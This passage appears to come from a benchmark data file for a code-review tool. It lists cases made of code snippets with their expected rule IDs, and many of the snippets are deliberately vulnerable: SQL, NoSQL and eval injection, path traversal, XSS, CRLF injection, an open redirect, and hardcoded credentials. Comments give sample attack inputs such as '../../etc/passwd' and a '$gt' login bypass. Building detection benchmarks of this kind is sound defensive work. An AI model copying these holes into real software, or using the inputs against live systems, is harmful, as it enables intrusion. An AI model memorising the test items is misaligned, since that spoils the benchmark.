async function shutdown(signal: string) {
  logger.info(\`Received \${signal}, starting graceful shutdown\`);
  server.close(() => logger.info("HTTP server closed"));
  await db.end();
  await redis.quit();
  await metrics.flush();
  logger.info("All connections closed, exiting");
  process.exit(0);
}

process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT", () => shutdown("SIGINT"));

// Health check for k8s readiness probe
app.get("/healthz", (req, res) => {
  const dbOk = db.totalCount > 0;
  const redisOk = redis.status === "ready";
  res.status(dbOk && redisOk ? 200 : 503).json({ db: dbOk, redis: redisOk });
});`,
    expectedRuleIds: ["REL-001"],
    unexpectedRuleIds: ["CLOUD", "OBS", "PERF"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-input-validation-zod-ts",
    description: "Request validation with Zod schema and proper error messages",
    language: "typescript",
    code: `import { z } from "zod";

const CreateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  age: z.number().int().min(13).max(150).optional(),
  role: z.enum(["user", "admin", "editor"]).default("user"),
});

app.post("/api/users", (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({
      error: "Validation failed",
      details: result.error.issues.map(i => ({
        field: i.path.join("."),
        message: i.message,
      })),
    });
  }
  return createUser(result.data);
});`,
    expectedRuleIds: ["API-001", "ERR-001"],
    unexpectedRuleIds: ["SEC", "DATA"],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "iac-terraform-no-state-lock-hcl",
    description: "Terraform backend without state locking enabled",
    language: "hcl",
    code: `terraform {
  backend "s3" {
    bucket = "my-state"
    key    = "prod/terraform.tfstate"
    region = "us-east-1"
    # No dynamodb_table for state locking
    # No encrypt = true
    # Concurrent terraform apply will corrupt state
  }
}`,
    expectedRuleIds: ["IAC-001", "REL-001"],
    category: "iac-security",
    difficulty: "medium",
  },
  {
    id: "cyber-path-traversal-ts",
    description: "File serving endpoint vulnerable to path traversal",
    language: "typescript",
    code: `app.get("/api/files/:filename", (req, res) => {
  const filePath = path.join("/uploads", req.params.filename);
  // Attacker: GET /api/files/../../etc/passwd
  res.sendFile(filePath);
});`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    category: "security",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // BATCH: Additional cases to reach 1000+ total loaded cases
  // Focus on high-detection categories for Grade A stability
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "adv-xss-svg-event-handler-ts",
    description: "SVG content rendered with inline event handlers from user input",
    language: "typescript",
    code: `app.get("/avatar/:userId", async (req, res) => {
  const userSvg = await db.getUserAvatar(req.params.userId);
  // User-uploaded SVG may contain: <svg onload="alert(1)">
  res.setHeader("Content-Type", "image/svg+xml");
  res.send(userSvg);
});`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    category: "xss",
    difficulty: "medium",
  },
  {
    id: "adv-auth-session-fixation-ts",
    description: "Session ID not regenerated after login",
    language: "typescript",
    code: `app.post("/login", async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);
  if (user) {
    // Session fixation: reuse existing session ID instead of regenerating
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});`,
    expectedRuleIds: ["AUTH-001", "SEC-001"],
    category: "auth",
    difficulty: "medium",
  },
  {
    id: "adv-sqli-dynamic-order-by-ts",
    description: "Dynamic ORDER BY clause from user input enables SQL injection",
    language: "typescript",
    code: `app.get("/api/products", async (req, res) => {
  const sortBy = req.query.sort || "name";
  const order = req.query.order || "ASC";
  const query = \`SELECT * FROM products ORDER BY \${sortBy} \${order}\`;
  const products = await db.query(query);
  res.json(products);
});`,
    expectedRuleIds: ["CYBER-001"],
    category: "injection",
    difficulty: "easy",
  },
  {
    id: "adv-err-swallowed-promise-ts",
    description: "Promise rejection silently swallowed with empty catch",
    language: "typescript",
    code: `async function syncUserData(userId: string) {
  try {
    const remoteData = await fetchRemoteProfile(userId);
    await db.users.update(userId, remoteData);
    await invalidateCache(userId);
    await sendSyncNotification(userId);
  } catch (e) {
    // Silently swallow all errors - no logging, no retry, no notification
  }
}`,
    expectedRuleIds: ["ERR-001"],
    category: "error-handling",
    difficulty: "easy",
  },
  {
    id: "adv-clean-rate-limited-api-ts",
    description: "API with proper rate limiting, input validation, and error handling",
    language: "typescript",
    code: `import rateLimit from "express-rate-limit";
import { z } from "zod";

const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100 });

const searchSchema = z.object({
  query: z.string().min(1).max(200),
  page: z.number().int().min(1).default(1),
  limit: z.number().int().min(1).max(50).default(10),
});

app.get("/api/search", limiter, async (req, res) => {
  const parsed = searchSchema.safeParse(req.query);
  if (!parsed.success) {
    return res.status(400).json({ error: parsed.error.flatten() });
  }
  const results = await searchService.search(parsed.data);
  res.json(results);
});`,
    expectedRuleIds: [],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "adv-auth-jwt-no-expiry-py",
    description: "JWT token created without expiration claim",
    language: "python",
    code: `import jwt

def create_token(user_id, role):
    payload = {
        "sub": user_id,
        "role": role,
        # Missing "exp" claim - token never expires
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def verify_token(token):
    return jwt.decode(token, SECRET_KEY, algorithms=["HS256"])`,
    expectedRuleIds: ["CYBER-001"],
    category: "auth",
    difficulty: "easy",
  },
  {
    id: "adv-injection-eval-template-ts",
    description: "User input passed to eval via template literal",
    language: "typescript",
    code: `app.post("/api/calculate", (req, res) => {
  const { expression } = req.body;
  try {
    const result = eval(\`(\${expression})\`);
    res.json({ result });
  } catch (e) {
    res.status(400).json({ error: "Invalid expression" });
  }
});`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    category: "injection",
    difficulty: "easy",
  },
  {
    id: "adv-iac-s3-no-versioning-hcl",
    description: "S3 bucket without versioning enabled",
    language: "hcl",
    code: `resource "aws_s3_bucket" "data_backup" {
  bucket = "company-data-backup"
  acl    = "private"

  # No versioning block - cannot recover from accidental deletion
  # No lifecycle rules
  # No replication configuration

  tags = {
    Environment = "production"
    Purpose     = "backup"
  }
}`,
    expectedRuleIds: [],
    category: "iac-security",
    difficulty: "easy",
  },
  {
    id: "adv-clean-parameterized-query-ts",
    description: "Properly parameterized database query with input validation",
    language: "typescript",
    code: `import { z } from "zod";

const userIdSchema = z.string().uuid();

async function getUser(userId: string) {
  const parsed = userIdSchema.parse(userId);
  const result = await pool.query(
    "SELECT id, name, email FROM users WHERE id = $1",
    [parsed]
  );
  return result.rows[0] ?? null;
}`,
    expectedRuleIds: [],
    category: "clean",
    difficulty: "easy",
  },
  {
    id: "adv-perf-sync-file-read-handler-ts",
    description: "Synchronous file read inside request handler blocks event loop",
    language: "typescript",
    code: `import { readFileSync } from "fs";

app.get("/api/config/:name", (req, res) => {
  const configPath = \`./configs/\${req.params.name}.json\`;
  // Blocks the entire event loop for every request
  const config = readFileSync(configPath, "utf-8");
  res.json(JSON.parse(config));
});`,
    expectedRuleIds: ["PERF-001"],
    category: "performance",
    difficulty: "easy",
  },
  {
    id: "adv-sec-cors-wildcard-creds-ts",
    description: "CORS allows all origins with credentials enabled",
    language: "typescript",
    code: `import cors from "cors";

app.use(cors({
  origin: "*",
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));`,
    expectedRuleIds: ["DATA-001"],
    category: "security",
    difficulty: "easy",
  },
  {
    id: "adv-db-raw-query-concat-py",
    description: "Raw SQL query built with string concatenation in Python",
    language: "python",
    code: `from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/users")
def search_users():
    name = request.args.get("name", "")
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE name LIKE '%" + name + "%'")
    return {"users": cursor.fetchall()}`,
    expectedRuleIds: ["CYBER-001", "DB-001"],
    category: "injection",
    difficulty: "easy",
  },
  {
    id: "adv-clean-env-validation-ts",
    description: "Environment variables validated at startup with typed schema",
    language: "typescript",
    code: `import { z } from "zod";

const envSchema = z.object({
  NODE_ENV: z.enum(["development", "staging", "production"]),
  DATABASE_URL: z.string().url(),
  REDIS_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  PORT: z.coerce.number().int().min(1).max(65535).default(3000),
});

export const env = envSchema.parse(process.env);`,
    expectedRuleIds: [],
    category: "clean",
    difficulty: "easy",
  },
  {
    id: "adv-a11y-missing-alt-img-tsx",
    description: "Image elements without alt text in React component",
    language: "tsx",
    code: `function ProductGallery({ products }: { products: Product[] }) {
  return (
    <div className="gallery">
      {products.map(p => (
        <div key={p.id} className="product-card">
          <img src={p.imageUrl} />
          <img src={p.thumbnailUrl} className="thumb" />
          <h3>{p.name}</h3>
          <p>{p.price}</p>
        </div>
      ))}
    </div>
  );
}`,
    expectedRuleIds: ["A11Y-001"],
    category: "accessibility",
    difficulty: "easy",
  },
  {
    id: "adv-err-unhandled-rejection-ts",
    description: "Unhandled promise rejection in async operation",
    language: "typescript",
    code: `class NotificationService {
  async sendBatch(userIds: string[], message: string) {
    // Fire-and-forget without error handling
    userIds.forEach(id => {
      this.sendPush(id, message);
      this.sendEmail(id, message);
      this.sendSMS(id, message);
    });
    return { status: "queued" };
  }

  private async sendPush(userId: string, msg: string) {
    const token = await this.getDeviceToken(userId);
    await pushClient.send(token, msg); // Can throw
  }
}`,
    expectedRuleIds: ["CYBER-001"],
    category: "error-handling",
    difficulty: "medium",
  },
  {
    id: "adv-injection-header-crlf-ts",
    description: "HTTP header injection via unsanitized user input in redirect",
    language: "typescript",
    code: `app.get("/redirect", (req, res) => {
  const target = req.query.url as string;
  // CRLF injection: user can inject headers via %0d%0a
  res.setHeader("Location", target);
  res.status(302).send("Redirecting...");
});`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    category: "injection",
    difficulty: "medium",
  },
  {
    id: "adv-auth-weak-password-policy-ts",
    description: "Registration endpoint with no password strength requirements",
    language: "typescript",
    code: `app.post("/api/register", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: "Missing fields" });
  }
  // No password strength check - accepts "1", "password", etc.
  const hash = await bcrypt.hash(password, 10);
  await db.users.create({ email, passwordHash: hash });
  res.json({ success: true });
});`,
    expectedRuleIds: ["CYBER-001", "API-001", "ERR-001"],
    category: "auth",
    difficulty: "easy",
  },
  {
    id: "adv-clean-secure-upload-ts",
    description: "File upload with type validation, size limits, and secure storage",
    language: "typescript",
    code: `import multer from "multer";
import { v4 as uuidv4 } from "uuid";
import path from "path";

const ALLOWED_TYPES = ["image/jpeg", "image/png", "image/webp"];
const MAX_SIZE = 5 * 1024 * 1024; // 5MB

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: MAX_SIZE },
  fileFilter: (req, file, cb) => {
    if (!ALLOWED_TYPES.includes(file.mimetype)) {
      cb(new Error("Invalid file type"));
      return;
    }
    cb(null, true);
  },
});

app.post("/api/upload", upload.single("avatar"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file" });
  const key = \`avatars/\${uuidv4()}\${path.extname(req.file.originalname)}\`;
  await s3.upload({ Bucket: BUCKET, Key: key, Body: req.file.buffer }).promise();
  res.json({ url: \`https://cdn.example.com/\${key}\` });
});`,
    expectedRuleIds: [],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "adv-iac-rds-public-access-hcl",
    description: "RDS instance publicly accessible with no encryption",
    language: "hcl",
    code: `resource "aws_db_instance" "main" {
  identifier        = "production-db"
  engine            = "mysql"
  engine_version    = "8.0"
  instance_class    = "db.t3.medium"
  allocated_storage = 100

  publicly_accessible    = true
  storage_encrypted      = false
  skip_final_snapshot    = true
  deletion_protection    = false

  username = "admin"
  password = "SuperSecret123!"
}`,
    expectedRuleIds: ["IAC-001", "AUTH-001"],
    category: "iac-security",
    difficulty: "easy",
  },
  {
    id: "adv-data-sensitive-in-localstorage-ts",
    description: "Storing sensitive tokens in browser localStorage",
    language: "typescript",
    code: `class AuthManager {
  login(token: string, refreshToken: string) {
    localStorage.setItem("access_token", token);
    localStorage.setItem("refresh_token", refreshToken);
    localStorage.setItem("user_ssn", this.currentUser.ssn);
  }

  getToken(): string | null {
    return localStorage.getItem("access_token");
  }
}`,
    expectedRuleIds: ["CYBER-001"],
    category: "data-security",
    difficulty: "easy",
  },
  {
    id: "adv-sec-hardcoded-api-key-py",
    description: "Hardcoded API key in Python source code",
    language: "python",
    code: `import requests

# Hardcoded API key - will be committed to version control
STRIPE_API_KEY = "sk_test_FAKE_KEY_FOR_BENCHMARK_00000"
SENDGRID_KEY = "SG.FAKE_SENDGRID_KEY_FOR_BENCHMARK_TEST_00000000000000000000000"

def charge_customer(amount, token):
    return requests.post(
        "https://api.stripe.com/v1/charges",
        headers={"Authorization": f"Bearer {STRIPE_API_KEY}"},
        data={"amount": amount, "source": token}
    )`,
    expectedRuleIds: ["AUTH-001", "SEC-001"],
    category: "security",
    difficulty: "easy",
  },
  {
    id: "adv-clean-structured-error-handler-ts",
    description: "Centralized error handler with proper classification and logging",
    language: "typescript",
    code: `class AppError extends Error {
  constructor(
    message: string,
    public readonly statusCode: number,
    public readonly code: string,
    public readonly isOperational: boolean = true
  ) {
    super(message);
    this.name = "AppError";
  }
}

function errorHandler(err: Error, req: Request, res: Response, next: NextFunction) {
  const logger = req.app.get("logger");
  if (err instanceof AppError && err.isOperational) {
    logger.warn({ code: err.code, path: req.path }, err.message);
    res.status(err.statusCode).json({ error: { code: err.code, message: err.message } });
  } else {
    logger.error({ err, path: req.path }, "Unhandled error");
    res.status(500).json({ error: { code: "INTERNAL_ERROR", message: "An unexpected error occurred" } });
  }
}`,
    expectedRuleIds: [],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "adv-injection-nosql-mongo-ts",
    description: "NoSQL injection via unvalidated MongoDB query operator",
    language: "typescript",
    code: `app.post("/api/login", async (req, res) => {
  const { username, password } = req.body;
  // NoSQL injection: { "username": {"$gt": ""}, "password": {"$gt": ""} }
  const user = await db.collection("users").findOne({
    username: username,
    password: password,
  });
  if (user) {
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});`,
    expectedRuleIds: ["CYBER-001", "AUTH-001"],
    category: "injection",
    difficulty: "medium",
  },
  {
    id: "adv-test-no-assertions-ts",
    description: "Test function with no assertions - always passes",
    language: "typescript",
    code: `describe("UserService", () => {
  it("should create a user", async () => {
    const service = new UserService();
    const user = await service.create({ name: "Test", email: "test@example.com" });
    // No assertions - test always passes even if createUser is broken
    console.log("User created:", user);
  });

  it("should delete a user", async () => {
    const service = new UserService();
    await service.delete("user-123");
    // No assertion that user was actually deleted
  });
});`,
    expectedRuleIds: ["TEST-001"],
    category: "testing",
    difficulty: "easy",
  },
  {
    id: "adv-sec-open-redirect-ts",
    description: "Open redirect vulnerability via unvalidated URL parameter",
    language: "typescript",
    code: `app.get("/auth/callback", async (req, res) => {
  const code = req.query.code as string;
  const returnUrl = req.query.return_to as string;

  await exchangeCodeForToken(code);

  // Open redirect - attacker: /auth/callback?return_to=https://evil.com
  res.redirect(returnUrl || "/dashboard");
});`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    category: "security",
    difficulty: "medium",
  },
];
